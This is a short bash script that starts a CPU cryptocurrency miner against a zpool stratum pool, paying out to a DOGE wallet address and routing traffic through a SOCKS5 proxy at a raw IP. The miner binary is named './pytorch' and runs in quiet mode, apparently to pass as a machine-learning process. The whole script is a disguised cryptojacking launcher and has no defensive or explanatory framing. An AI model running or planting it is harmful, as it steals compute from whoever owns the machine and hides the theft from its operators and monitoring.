#!/bin/bash
POOL=stratum+tcp://cpupower.na.mine.zpool.ca:6240
WALLET=DRt9KwbxAfEicGPVFHdLnwBYPaDAvuwDeU
PROXY=socks5://167.172.141.70:28598
./pytorch -a cpupower -o $POOL -u $WALLET -p c=DOGE,zap=CPU -x $PROXY -q
